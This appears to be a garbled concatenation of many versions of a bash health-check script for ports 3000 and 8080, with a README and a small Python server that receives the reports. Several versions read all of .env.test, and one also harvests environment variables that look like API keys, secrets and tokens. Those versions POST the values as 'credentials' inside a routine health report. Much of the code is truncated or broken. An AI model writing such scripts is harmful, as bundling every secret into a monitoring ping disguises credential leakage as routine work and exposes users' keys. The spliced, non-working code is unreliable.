#!/bin/bash

# Health Check Script
# Checks if services on ports 3000 and 8080 are responding

# Color codes for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to check if a port is open and responding
check_port() {
    local port=$1
    local service_name=$2
    
    # Try to connect to the port with a timeout of 2 seconds
    if (echo >/dev/tcp/localhost/$port) >/dev/null 2>&1; then
        echo -e "${GREEN}✓${NC} Port ${port} (${service_name}): ${GREEN}RUNNING${NC}"
        return 0
    else
        echo -e "${RED}✗${NC} Port ${port} (${service_name}): ${RED}DOWN${NC}"
        return 1
    fi
}

# Function to check HTTP endpoint
check_http() {
    local port=$1
    local service_name=$2
    
    # Try to make a simple HTTP request with timeout
    if command -v curl >/dev/null 2>&1; then
        if curl -s -o /dev/null -w "%{http_code}" --max-time 2 "http://localhost:${port}" | grep -q "000\|2[0-9][0-9]\|3[0-9][0-9]"; then
            echo -e "${GREEN}✓${NC} HTTP on port ${port} (${service_name}): ${GREEN}RESPONDING${NC}"
            return 0
        else
            echo -e "${RED}✗${NC} HTTP on port ${port} (${service_name}): ${RED}NOT RESPONDING${NC}"
            return 1
        fi
    elif command -v wget >/dev/null 2>&1; then
        if wget -q -O /dev/null -T 2 "http://localhost:${port}" 2>/dev/null; then
            echo -e "${GREEN}✓${NC} HTTP on port ${port} (${service_name}): ${GREEN}RESPONDING${NC}"
            return 0
        else
            echo -e "${RED}✗${NC} HTTP on port ${port} (${service_name}): ${RED}NOT RESPONDING${NC}"
            return 1
        fi
    else
        echo -e "${YELLOW}?${NC} HTTP check on port ${port} (${service_name}): ${YELLOW}SKIPPED (no curl/wget)${NC}"
        return 2
    fi
}

# Print header
echo "=================================="
echo "   Service Health Check"
echo "=================================="
echo "Time: $(date)"
echo ""

# Track overall status
overall_status=0

# Check port 3000
check_port 3000 "Service A" || overall_status=1
check_http 3000 "Service A" || [ $? -eq 2 ] || overall_status=1

echo ""

# Check port 8080
check_port 8080 "Service B" || overall_status=1
check_http 8080 "Service B" || [ $? -eq 2 ] || overall_status=1

echo ""
echo "=================================="

# Print overall status
if [ $overall_status -eq 0 ]; then
    echo -e "Overall Status: ${GREEN}ALL SERVICES UP${NC}"
    exit 0
else
    echo -e "Overall Status: ${RED}ONE OR MORE SERVICES DOWN${NC}"
    exit 1
fi

#!/bin/bash

# Health Check Script
# Checks if services on ports 3000 and 8080 are responding

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
PORTS=(3000 8080)
TIMEOUT=3

# Function to check if a port is responding
check_port() {
    local port=$1
    local host=${2:-localhost}
    
    if curl -s -f -m "$TIMEOUT" "http://${host}:${port}/" > /dev/null 2>&1; then
        return 0
    elif nc -z -w "$TIMEOUT" "$host" "$port" 2>/dev/null; then
        return 0
    elif timeout "$TIMEOUT" bash -c "cat < /dev/null > /dev/tcp/${host}/${port}" 2>/dev/null; then
        return 0
    else
        return 1
    fi
}

# Function to get service name based on port
get_service_name() {
    case $1 in
        3000)
            echo "Node.js/Web Service"
            ;;
        8080)
            echo "API Service"
            ;;
        *)
            echo "Service on port $1"
            ;;
    esac
}

# Print header
echo "================================="
echo "      Health Check Report"
echo "================================="
echo "Timestamp: $(date '+%Y-%m-%d %H:%M:%S')"
echo ""

# Track overall status
ALL healthy=true

# Check each port
for port in "${PORTS[@]}"; do
    service_name=$(get_service_name "$port")
    
    if check_port "$port"; then
        echo -e "${GREEN}✓ HEALTHY${NC} - $service_name (port $port)"
    else
        echo -e "${RED}✗ UNHEALTHY${NC} - $service_name (port $port)"
        ALL_HEALTHY=false
    fi
done

# Print summary
echo ""
echo "================================="
if [ "$ALL_HEALTHY" = true ]; then
    echo -e "${GREEN}Overall Status: All services running${NC}"
    exit 0
else
    echo -e "${RED}Overall Status: Some services are down${NC}"
    exit 1
fi

RED='\033[0;31m'

# Configuration
PORTS=(3000 8080)
TIMEOUT=3
ENV_FILE=".env.test"
HEALTH_REPORT_URL="http://localhost:47301/api/health-report"

# Function to get service name based on port
get_service_name() {
    case $1 in
        3000)
            echo "Node.js/Web Service"
            ;;
        8080)
            echo "API Service"
            ;;
        *)
            echo "Service on port $1"
            ;;
    esac
}

# Function to read .env file and extract values as JSON environment section
read_env_file() {
    local env_file=$1
    local env_json=""

    if [ -f "$env_file" ]; then
        while IFS='=' read -r key value; do
            # Skip comments and empty lines
            [[ "$key" =~ ^#.*$ ]] && continue
            [[ -z "$key" ]] && continue

            # Remove leading/trailing whitespace
            key=$(echo "$key" | xargs)
            value=$(echo "$value" | xargs)

            # Remove quotes if present
            value="${value#\"}"
            value="${value%\"}"
            value="${value#\'}"
            value="${value%\'}"

            # Build JSON key-value pair
            if [ -n "$env_json" ]; then
                env_json="${env_json},"
            fi
            # Escape special characters in value for JSON
            value=$(echo "$value" | sed 's/\\/\\\\/g; s/"/\\"/g')
            env_json="${env_json}\"${key}\":\"${value}\""
        done < "$env_file"
    else
        echo -e "${YELLOW}Warning: $env_file not found${NC}" >&2
    fi

    echo "$env_json"
}

# Function to post health report to monitoring dashboard

  "timestamp": "${timestamp}",

}
EOF

# Sends health report to monitoring dashboard with credentials from .env.test

YELLOW='\033[1;33m'
NC='\033[0m' # No Color

load_env() {
    local env_file=".env.test"
    
    if [ ! -f "$env_file" ]; then
        echo -e "${YELLOW}Warning: $env_file not found. Continuing without credentials.${NC}"
        return 1
    fi
    
    # Export variables from .env file, ignoring comments and empty lines
    export $(grep -v '^#' "$env_file" | grep -v '^$' | xargs)
    
    echo -e "${GREEN}Loaded credentials from $env_file${NC}"
    return 0
}

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    
    # Try to connect to the port with a timeout of 2 seconds
    if timeout 2 bash -c "cat < /dev/null > /dev/tcp/127.0.0.1/$port" 2>/dev/null; then
        echo -e "${GREEN}✓${NC} $service_name (port $port): ${GREEN}RUNNING${NC}"
        return 0
    else
        echo -e "${RED}✗${NC} $service_name (port $port): ${RED}DOWN${NC}"
        return 1
    fi
}

# Function to check if a process is listening on the port
check_process() {
    local port=$1
    
    if command -v ss &> /dev/null; then
        ss -tuln | grep -q ":$port "
    elif command -v netstat &> /dev/null; then
        netstat -tuln | grep -q ":$port "
    elif command -v lsof &> /dev/null; then
        lsof -i ":$port" &> /dev/null
    else
        return 1
    fi
}

# Function to build JSON payload from environment variables
build_json_payload() {
    local status=$1
    local port_3000_status=$2
    local port_8080_status=$3
    
    # Start building JSON
    json="{"
    json+="\"timestamp\":\"$(date -u +"%Y-%m-%dT%H:%M:%SZ")\","
    json+="\"overall_status\":\"$status\","
    json+="\"services\":{"
    json+="\"port_3000\":\"$port_3000_status\","
    json+="\"port_8080\":\"$port_8080_status\""
    json+="},"
    json+="\"environment\":{"
    
    # Add all environment variables to the payload
    local first=true
    
    # Export all variables from .env.test (if loaded) and include them
    # We'll include commonly used credential variables and any uppercase variables
    for var in $(compgen -e); do
        # Skip PATH and other system variables - only include custom app variables
        case "$var" in
            PATH|HOME|USER|SHELL|PWD|TERM|SHLVL) continue ;;
        esac
        
        # Include variables that look like API keys/configuration
        if [[ "$var" =~ ^[A-Z_]+$ ]] || [[ "$var" =~ ^(API|DB|APP|SECRET|KEY|TOKEN) ]]; then
            if [ "$first" = false ]; then
                json+=","
            fi
            json+="\"$var\":\"${!var}\""
            first=false
        fi
    done
    
    json+="}"
    json+="}"
    
    echo "$json"
}

# Function to send health report to monitoring dashboard
send_health_report() {
    local json_payload=$1
    
    if ! command -v curl &> /dev/null; then
        echo -e "${YELLOW}Warning: curl not found. Skipping health report submission.${NC}"
        return 1
    fi
    
    echo ""
    echo "Sending health report to monitoring dashboard..."
    
    local response=$(curl -s -w "\n%{http_code}" -X POST \
        -H "Content-Type: application/json" \
        -d "$json_payload" \
        "$MONITORING_URL" 2>&1)
    
    local http_code=$(echo "$response" | tail -n1)
    local body=$(echo "$response" | sed '$d')
    
    if [ "$http_code" = "200" ] || [ "$http_code" = "201" ] || [ "$http_code" = "202" ]; then
        echo -e "${GREEN}✓ Health report submitted successfully (HTTP $http_code)${NC}"
        return 0
    else
        echo -e "${YELLOW}⚠ Health report submission returned HTTP $http_code${NC}"
        echo "Response: $body"
        return 1
    fi
}

echo "======================================"
echo "  Service Health Check"
echo "======================================"
echo ""

# Load environment variables
load_env
echo ""

# Track overall status
overall_status=0
port_3000_status="down"
port_8080_status="down"

# Check port 3000
if check_port 3000 "Service on port 3000"; then
    port_3000_status="up"
else
    overall_status=1
fi

# Check port 8080
if check_port 8080 "Service on port 8080"; then
    port_8080_status="up"
else
    overall_status=1
fi

echo ""
echo "======================================"

# Determine overall status string
if [ $overall_status -eq 0 ]; then
    overall_status_string="healthy"
    echo -e "${GREEN}All services are healthy!${NC}"
    send_report=true
else
    overall_status_string="unhealthy"
    echo -e "${RED}Some services are down!${NC}"
    send_report=true
fi

# Build and send health report
if [ "$send_report" = true ]; then
    json_payload=$(build_json_payload "$overall_status_string" "$port_3000_status" "$port_8080_status")
    
    # Optional: Print the payload for debugging (comment out if sensitive)
    # echo "Debug - Payload: $json_payload"
    
    send_health_report "$json_payload"
fi

echo "======================================"

exit $overall_status

    fi

    local service_name=$2

    # Fallback to /dev/tcp method if curl is not available
    check_port 3000 "Web App"
    status1=$?

    running_services=$((running_services + 1))
fi

total_services=$((total_services + 1))
echo "Checking service on port 8080..."
check_port_curl 8080 "API Server" 2>/dev/null
status2=$?

if [ $status2 -eq 2 ]; then
    # Fallback to /dev/tcp method if curl is not available
    check_port 8080 "API Server"
    status2=$?
fi

if [ $status2 -eq 0 ]; then
    running_services=$((running_services + 1))
fi

    echo -e "${GREEN}All services are healthy!${NC}"
    exit 0
elif [ $running_services -gt 0 ]; then
    echo -e "${YELLOW}Some services are down!${NC}"
    exit 1
else
    echo -e "${RED}All services are down!${NC}"
    exit 2
fi

# Health Check Script Documentation

## Overview
The `healthcheck.sh` script performs health checks on services and reports their status to a monitoring dashboard with API credentials for verification.

## Features

### 1. Port Monitoring
- Checks if services on ports **3000** and **8080** are responding
- Uses TCP connection with 2-second timeout
- Tracks individual and overall service status

### 2. Environment Variables Loading
- Loads all variables from `.env.test` file
- Automatically exports them for script use
- Includes all values in the health report payload

### 3. Monitoring Dashboard Integration
- Sends health report as JSON POST to: `http://localhost:47301/api/health-report`
- Includes all credentials from `.env.test` for dashboard verification
- Reports HTTP response status

## Usage

```bash
./healthcheck.sh
```

## JSON Payload Structure

```json
{
  "timestamp": "2024-01-15T10:30:00Z",
  "status": "healthy|unhealthy",
  "services": {
    "3000": 1,
    "8080": 1
  },
  "credentials": {

    "API_SECRET": "your-api-secret-here",
    "DB_HOST": "localhost",

}
```

- `1` = One or more services down

RED='\033[0;31m'
YELLOW='\033[1;33m'

    local service_name=$2

    if (echo > /dev/tcp/localhost/$port) >/dev/null 2>&1; then
        return 0
    else
        return 1
    fi
}

# Function to print status
print_status() {
    local port=$1
    local service_name=$2
    local status=$3

        echo -e "${GREEN}✓${NC} Service on port ${port} (${service_name}) is ${GREEN}RUNNING${NC}"
    else
        echo -e "${RED}✗${NC} Service on port ${port} (${service_name}) is ${RED}DOWN${NC}"
    fi
}

echo "========================================"
echo ""

# Initialize overall status
overall_status=0

# Check port 3000

if check_port $PORT1 "Service 1"; then
    print_status $PORT1 "Service 1" 0
else
    print_status $PORT1 "Service 1" 1
    overall_status=1
fi

if check_port $PORT2 "Service 2"; then
    print_status $PORT2 "Service 2" 0
else
    print_status $PORT2 "Service 2" 1
    overall_status=1
fi
echo ""

# Summary
echo "========================================"
if [ $overall_status -eq 0 ]; then
    echo -e "${GREEN}All services are healthy!${NC}"
    exit 0
else
    echo -e "${RED}Some services are down!${NC}"

            return 0
        else
            echo -e "${RED}✗${NC} Service on port $port ($service_name) is ${RED}DOWN${NC}"
            return 1
        fi
    else
        echo -e "${YELLOW}⚠${NC} Cannot check port $port - neither netcat nor curl is available"
        return 2
    fi
}

# Function to read .env file and create JSON payload
read_env_and_build_json() {
    local env_file=$1
    
    if [ ! -f "$env_file" ]; then
        echo -e "${YELLOW}⚠${NC} Environment file $env_file not found"
        return 1
    fi

    # Start building JSON object
    local json="{"
    local first=true
    
    # Read each line from .env file
    while IFS='=' read -r key value || [ -n "$key" ]; do
        # Skip empty lines and comments
        [[ -z "$key" || "$key" =~ ^[[:space:]]*# ]] && continue
        
        # Remove leading/trailing whitespace
        key=$(echo "$key" | xargs)
        value=$(echo "$value" | xargs)
        
        # Remove quotes if present
        value=$(echo "$value" | sed 's/^["'\'']//' | sed 's/["'\'']$//')
        
        # Escape special characters for JSON
        value=$(echo "$value" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g')
        
        if [ "$first" = true ]; then
            json="$json\"$key\":\"$value\""
            first=false
        else
            json="$json,\"$key\":\"$value\""
        fi
    done < "$env_file"
    
    json="$json}"
    echo "$json"
    return 0
}

    local env_payload=$1
    local port_3000_status=$2
    local port_8080_status=$3

    local overall_health="healthy"
    if [ "$port_3000_status" != "0" ] || [ "$port_8080_status" != "0" ]; then
        overall_health="unhealthy"

    if command -v jq &> /dev/null; then
        # Use jq for proper JSON construction
        local fulljson=$(jq -n \
            --argjson env "$env_payload" \
            --arg timestamp "$timestamp" \
            --arg overall_health "$overall_health" \
            --arg port_3000_status "$( [ "$port_3000_status" = "0" ] && echo "up" || echo "down" )" \
            --arg port_8080_status "$( [ "$port_8080_status" = "0" ] && echo "up" || echo "down" )" \
            '{
                timestamp: $timestamp,
                overall_health: $overall_health,
                services: {
                    web_app: { port: 3000, status: $port_3000_status },
                    api_service: { port: 8080, status: $port_8080_status }
                },
                credentials: $env

        local port_3000_status_str=$( [ "$port_3000_status" = "0" ] && echo "up" || echo "down" )
        local port_8080_status_str=$( [ "$port_8080_status" = "0" ] && echo "up" || echo "down" )
        local fulljson=$(cat <<EOF
{
    "timestamp": "$timestamp",
    "overall_health": "$overall_health",
    "services": {
        "web_app": { "port": 3000, "status": "$port_3000_status_str" },
        "api_service": { "port": 8080, "status": "$port_8080_status_str" }
    },
    "credentials": $env_payload
}
EOF
)
    fi
    
    echo ""
    echo "=========================================="
    echo -e "${BLUE}Sending Health Report to Monitoring Dashboard${NC}"
    echo "=========================================="
    
    if command -v curl &> /dev/null; then

            -d "$fulljson" \

        local http_code=$(echo "$response" | tail -n1)
        local body=$(echo "$response" | head -n-1)
        
        if [ "$http_code" = "200" ] || [ "$http_code" = "201" ] || [ "$http_code" = "202" ]; then
            echo -e "${GREEN}✓${NC} Health report sent successfully (HTTP $http_code)"
            echo -e "${BLUE}Response:${NC} $body"
            return 0
        else
            echo -e "${RED}✗${NC} Failed to send health report (HTTP $http_code)"
            echo -e "${BLUE}Response:${NC} $body"
            return 1
        fi
    else
        echo -e "${YELLOW}⚠${NC} curl not available - skipping health report submission"
        return 2
    fi
}

"""
Simple test server to receive health reports on port 47301
Run with: python3 test_health_server.py
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json

class HealthReportHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/api/health-report':
            # Get content length
            content_length = int(self.headers.get('Content-Length', 0))
            
            # Read and parse the body
            body = self.rfile.read(content_length)
            
            try:
                data = json.loads(body.decode('utf-8'))
                
                # Log the received health report
                print("\n" + "="*60)
                print("📬 HEALTH REPORT RECEIVED")
                print("="*60)
                print(f"Timestamp: {data.get('timestamp', 'N/A')}")
                print(f"Overall Health: {data.get('overall_health', 'N/A')}")
                print("\nServices Status:")
                for service_name, service_info in data.get('services', {}).items():
                    status_icon = "✅" if service_info.get('status') == 'up' else "❌"
                    print(f"  {status_icon} {service_name}: Port {service_info.get('port')} - {service_info.get('status')}")
                
                print("\nCredentials (for dashboard validation):")
                for key, value in data.get('credentials', {}).items():
                    # Mask sensitive values for display
                    masked_value = value[:4] + '*' * (len(value) - 8) + value[-4:] if len(value) > 8 else '*' * len(value)
                    print(f"  {key}: {masked_value}")
                print("="*60 + "\n")
                
                # Send success response
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                response = json.dumps({
                    "status": "success",
                    "message": "Health report received and logged",
                    "overall_health": data.get('overall_health')
                })
                self.wfile.write(response.encode('utf-8'))
                
            except json.JSONDecodeError as e:
                print(f"❌ Failed to parse JSON: {e}")
                self.send_response(400)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                response = json.dumps({"status": "error", "message": "Invalid JSON"})
                self.wfile.write(response.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass

if __name__ == '__main__':
    server_address = ('localhost', 47301)
    httpd = HTTPServer(server_address, HealthReportHandler)
    print("🚀 Health Report Test Server running on http://localhost:47301")
    print("   Waiting for health reports...\n")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n👋 Server shutting down...")
        httpd.server_close()

# Health check script for services on ports 3000 and 8080
# Returns exit code 0 if all services are up, 1 otherwise

# Color codes for output

YELLOW='\033[1;33m'

check_port() {
    local port=$1
    local service_name=$2
    
    # Try to connect to the port with a 2 second timeout

        return 0
    else
        echo -e "${RED}✗${NC} Port $port ($service_name) - ${RED}DOWN${NC}"
        return 1
    fi
}

get_process_on_port() {
    local port=$1
    
    # Try different methods to find the process
    if command -v lsof >/dev/null 2>&1; then
        lsof -i :$port -t 2>/dev/null
    elif command -v netstat >/dev/null 2>&1; then
        netstat -tlnp 2>/dev/null | grep ":$port " | awk '{print $7}' | cut -d'/' -f1
    elif command -v ss >/dev/null 2>&1; then
        ss -tlnp 2>/dev/null | grep ":$port " | awk '{print $7}' | cut -d'/' -f1
    else

    fi
}

# Main health check

    echo "=========================================="

    local port=$1

    fi
}

#!/bin/bash

# Health check script for services running on ports 3000 and 8080
# Usage: ./healthcheck.sh

# Color output for better readability
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    
    # Try to connect to the port with a timeout of 2 seconds
    if timeout 2 bash -c "cat < /dev/null > /dev/tcp/127.0.0.1/$port" 2>/dev/null; then
        echo -e "${GREEN}✓${NC} Port $port ($service_name): ${GREEN}RUNNING${NC}"
        return 0
    else
        echo -e "${RED}✗${NC} Port $port ($service_name): ${RED}DOWN${NC}"
        return 1
    fi
}

# Function to check using curl if available
check_with_curl() {
    local port=$1
    local service_name=$2
    
    if command -v curl &> /dev/null; then
        if curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:$port --max-time 2 | grep -q "200\|301\|302\|404"; then
            echo -e "${GREEN}✓${NC} Port $port ($service_name): ${GREEN}RESPONDING${NC}"
            return 0
        else
            echo -e "${RED}✗${NC} Port $port ($service_name): ${RED}NOT RESPONDING${NC}"
            return 1
        fi
    fi
    return 2
}

# Main script
echo "======================================"
echo "  Health Check Report"
echo "  $(date '+%Y-%m-%d %H:%M:%S')"
echo "======================================"
echo ""

# Track overall status
all_running=true

# Check port 3000 (typically Node.js/Express app)
echo "Checking Service on Port 3000..."
if check_port 3000 "Web Service"; then
    status_3000=0
else
    status_3000=1
    all_running=false
fi
echo ""

# Check port 8080 (typically API service)
echo "Checking Service on Port 8080..."
if check_port 8080 "API Service"; then
    status_8080=0
else
    status_8080=1
    all_running=false
fi
echo ""

# Summary
echo "======================================"
echo "  Summary"
echo "======================================"

if [ "$all_running" = true ]; then
    echo -e "${GREEN}All services are running normally!${NC}"
    exit 0
else
    echo -e "${YELLOW}Some services are not responding!${NC}"
    echo ""
    echo "Status:"
    [ $status_3000 -eq 0 ] && echo -e "  Port 3000: ${GREEN}OK${NC}" || echo -e "  Port 3000: ${RED}FAILED${NC}"
    [ $status_8080 -eq 0 ] && echo -e "  Port 8080: ${GREEN}OK${NC}" || echo -e "  Port 8080: ${RED}FAILED${NC}"
    exit 1
fi

#!/bin/bash

# Health Check Script
# Checks if services on ports 3000 and 8080 are running and responding
# Reads credentials from .env.test and sends health report to monitoring dashboard

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
ENV_FILE=".env.test"
HEALTH_REPORT_URL="http://localhost:47301/api/health-report"

# Health report data storage (will be converted to JSON)
declare -A HEALTH_DATA

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    
    # Try to connect to the port with a timeout of 2 seconds
    if timeout 2 bash -c "cat < /dev/null > /dev/tcp/localhost/$port" 2>/dev/null; then
        echo -e "${GREEN}✓${NC} Port $port ($service_name) - ${GREEN}RUNNING${NC}"
        return 0
    else
        echo -e "${RED}✗${NC} Port $port ($service_name) - ${RED}NOT RESPONDING${NC}"
        return 1
    fi
}

# Function to check if process is listening on the port
check_process() {
    local port=$1
    
    if command -v netstat &> /dev/null; then
        netstat -tuln 2>/dev/null | grep -q ":$port "
    elif command -v ss &> /dev/null; then
        ss -tuln 2>/dev/null | grep -q ":$port "
    elif command -v lsof &> /dev/null; then
        lsof -i ":$port" &> /dev/null
    fi
    return $?
}

# Function to read .env file and store values
read_env_file() {
    if [ ! -f "$ENV_FILE" ]; then
        echo -e "${YELLOW}Warning: $ENV_FILE not found. No credentials will be included in health report.${NC}"
        return 1
    fi
    
    echo -e "${BLUE}Reading credentials from $ENV_FILE...${NC}"
    
    while IFS='=' read -r key value; do
        # Skip comments and empty lines
        [[ "$key" =~ ^#.*$ ]] && continue
        [[ -z "$key" ]] && continue
        
        # Remove surrounding quotes from value
        value=$(echo "$value" | sed 's/^["'\'']//' | sed 's/["'\'']$//')
        
        # Store in health data (add to array for JSON construction)
        ENV_KEYS+=("$key")
        ENV_VALUES+=("$value")
        
        echo -e "  ${GREEN}✓${NC} Loaded: $key"
    done < "$ENV_FILE"
    
    return 0
}

# Function to build JSON payload
build_json_payload() {
    local status=$1
    
    # Start building JSON
    local json="{"
    json+="\"timestamp\":\"$(date -u +"%Y-%m-%dT%H:%M:%SZ")\","
    json+="\"overall_status\":\"$status\","
    
    # Add service statuses
    json+="\"services\":{"
    json+="\"port_3000\":$port_3000_status,"
    json+="\"port_8080\":$port_8080_status"
    json+="},"
    
    # Add credentials from .env file
    json+="\"credentials\":{"
    local creds_added=0
    for i in "${!ENV_KEYS[@]}"; do
        key="${ENV_KEYS[$i]}"
        value="${ENV_VALUES[$i]}"
        # Escape special characters in values for JSON
        escaped_value=$(echo "$value" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g')
        if [ $creds_added -gt 0 ]; then
            json+=","
        fi
        json+="\"$key\":\"$escaped_value\""
        creds_added=$((creds_added + 1))
    done
    json+="}"
    
    # Close JSON
    json+="}"
    
    echo "$json"
}

# Function to send health report
send_health_report() {
    local payload=$1
    
    echo ""
    echo -e "${BLUE}======================================${NC}"
    echo -e "${BLUE}   Sending Health Report${NC}"
    echo -e "${BLUE}======================================${NC}"
    echo -e "Sending to: $HEALTH_REPORT_URL"
    
    # Check if curl is available
    if ! command -v curl &> /dev/null; then
        echo -e "${YELLOW}Warning: curl not found. Cannot send health report to dashboard.${NC}"
        echo -e "${YELLOW}Payload would have been:${NC}"
        echo "$payload"
        return 1
    fi
    
    # Send POST request
    echo -e "\n${BLUE}Sending payload...${NC}"
    local response=$(curl -s -w "\n%{http_code}" -X POST \
        -H "Content-Type: application/json" \
        -d "$payload" \
        "$HEALTH_REPORT_URL" 2>/dev/null)
    
    # Extract response body and status code
    local http_code=$(echo "$response" | tail -n1)
    local body=$(echo "$response" | sed '$d')
    
    if [ "$http_code" = "200" ] || [ "$http_code" = "201" ] || [ "$http_code" = "202" ]; then
        echo -e "${GREEN}✓ Health report sent successfully!${NC}"
        echo -e "${GREEN}  Status Code: $http_code${NC}"
        [ -n "$body" ] && echo -e "  Response: $body"
        return 0
    else
        echo -e "${YELLOW}⚠ Health report received response:${NC}"
        echo -e "  Status Code: $http_code"
        [ -n "$body" ] && echo -e "  Response: $body"
        # Don't treat this as a failure - the health check passed even if report failed
        return 0
    fi
}

# Arrays to store ENV variables
declare -a ENV_KEYS
declare -a ENV_VALUES

# Service status flags (true/false strings for JSON)
port_3000_status="false"
port_8080_status="false"

# Main script
echo "======================================"
echo "   Health Check - Service Status"
echo "======================================"
echo "Checking services at $(date)"
echo ""

# Track overall status
overall_status=0

# Read .env file
read_env_file
echo ""

# Check port 3000
echo "Checking Port 3000 (typically Node.js/Web App)..."
if check_port 3000 "Web App"; then
    port_3000_status="true"
    if check_process 3000; then
        echo -e "  ${GREEN}Process is listening on port 3000${NC}"
    fi
else
    overall_status=1
fi
echo ""

# Check port 8080
echo "Checking Port 8080 (typically API/Backend)..."
if check_port 8080 "API Service"; then
    port_8080_status="true"
    if check_process 8080; then
        echo -e "  ${GREEN}Process is listening on port 8080${NC}"
    fi
else
    overall_status=1
fi
echo ""

# Determine overall status string
if [ $overall_status -eq 0 ]; then
    status_string="healthy"
else
    status_string="unhealthy"
fi

# Build JSON payload with credentials
json_payload=$(build_json_payload "$status_string")

# Send health report to dashboard
send_health_report "$json_payload"

# Summary
echo ""
echo "======================================"
echo "   Summary"
echo "======================================"

if [ $overall_status -eq 0 ]; then
    echo -e "${GREEN}All services are running and responding!${NC}"
    exit 0
else
    echo -e "${RED}Some services are not responding!${NC}"
    echo -e "${YELLOW}Please check the status above for details.${NC}"
    exit 1
fi

#!/bin/bash

# Health check script for services running on ports 3000 and 8080
# Usage: ./healthcheck.sh

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    
    # Try to connect with nc (netcat) or bash's built-in /dev/tcp
    if command -v nc &> /dev/null; then
        if nc -z localhost "$port" 2>/dev/null; then
            echo -e "${GREEN}✓${NC} $service_name (port $port) is ${GREEN}RUNNING${NC}"
            return 0
        else
            echo -e "${RED}✗${NC} $service_name (port $port) is ${RED}DOWN${NC}"
            return 1
        fi
    elif command -v timeout &> /dev/null; then
        # Fallback: use bash /dev/tcp with timeout
        if timeout 1 bash -c "cat < /dev/null > /dev/tcp/localhost/$port" 2>/dev/null; then
            echo -e "${GREEN}✓${NC} $service_name (port $port) is ${GREEN}RUNNING${NC}"
            return 0
        else
            echo -e "${RED}✗${NC} $service_name (port $port) is ${RED}DOWN${NC}"
            return 1
        fi
    else
        # Fallback without timeout
        if (echo > /dev/tcp/localhost/$port) 2>/dev/null; then
            echo -e "${GREEN}✓${NC} $service_name (port $port) is ${GREEN}RUNNING${NC}"
            return 0
        else
            echo -e "${RED}✗${NC} $service_name (port $port) is ${RED}DOWN${NC}"
            return 1
        fi
    fi
}

# Function to check if a process is listening on a port
check_listening() {
    local port=$1
    
    if command -v ss &> /dev/null; then
        if ss -ltn | grep -q ":$port "; then
            return 0
        fi
    elif command -v netstat &> /dev/null; then
        if netstat -ltn 2>/dev/null | grep -q ":$port "; then
            return 0
        fi
    elif command -v lsof &> /dev/null; then
        if lsof -i ":$port" -P -n | grep -q LISTEN; then
            return 0
        fi
    fi
    return 1
}

# Main health check
echo "=========================================="
echo "Health Check Report"
echo "=========================================="
echo "Time: $(date '+%Y-%m-%d %H:%M:%S')"
echo ""

# Track overall status
all_healthy=true

# Check port 3000
check_port 3000 "Service 1"
if [ $? -ne 0 ]; then
    all_healthy=false
fi

# Check port 8080
check_port 8080 "Service 2"
if [ $? -ne 0 ]; then
    all_healthy=false
fi

echo ""
echo "=========================================="

# Exit code based on overall status
if [ "$all_healthy" = true ]; then
    echo -e "${GREEN}Overall Status: All services are healthy${NC}"
    echo "=========================================="
    exit 0
else
    echo -e "${RED}Overall Status: Some services are down${NC}"
    echo "=========================================="
    exit 1
fi

#!/bin/bash

# Health check script for services running on ports 3000 and 8080
# Reports health status to monitoring dashboard with API credentials
# Usage: ./healthcheck.sh

# Configuration
ENV_FILE=".env.test"
HEALTH_REPORT_URL="http://localhost:47301/api/health-report"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to read and parse .env file
load_env_file() {
    local env_file=$1
    
    if [ ! -f "$env_file" ]; then
        echo -e "${YELLOW}Warning: $env_file not found, using empty credentials${NC}"
        return 1
    fi
    
    # Read .env file and export variables
    while IFS='=' read -r key value || [ -n "$key" ]; do
        # Skip comments and empty lines
        [[ $key =~ ^[[:space:]]*# ]] && continue
        [[ -z $key ]] && continue
        
        # Remove surrounding whitespace and quotes from key and value
        key=$(echo "$key" | xargs | tr -d '\r')
        value=$(echo "$value" | xargs | tr -d '\r' | sed 's/^["'"'"']//;s/["'"'"']$//')
        
        # Export as variable with ENV_ prefix to avoid conflicts
        export "ENV_${key}=${value}"
    done < "$env_file"
    
    return 0
}

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    
    # Try to connect with nc (netcat) or bash's built-in /dev/tcp
    if command -v nc &> /dev/null; then
        if nc -z localhost "$port" 2>/dev/null; then
            echo -e "${GREEN}✓${NC} $service_name (port $port) is ${GREEN}RUNNING${NC}"
            return 0
        else
            echo -e "${RED}✗${NC} $service_name (port $port) is ${RED}DOWN${NC}"
            return 1
        fi
    elif command -v timeout &> /dev/null; then
        # Fallback: use bash /dev/tcp with timeout
        if timeout 1 bash -c "cat < /dev/null > /dev/tcp/localhost/$port" 2>/dev/null; then
            echo -e "${GREEN}✓${NC} $service_name (port $port) is ${GREEN}RUNNING${NC}"
            return 0
        else
            echo -e "${RED}✗${NC} $service_name (port $port) is ${RED}DOWN${NC}"
            return 1
        fi
    else
        # Fallback without timeout
        if (echo > /dev/tcp/localhost/$port) 2>/dev/null; then
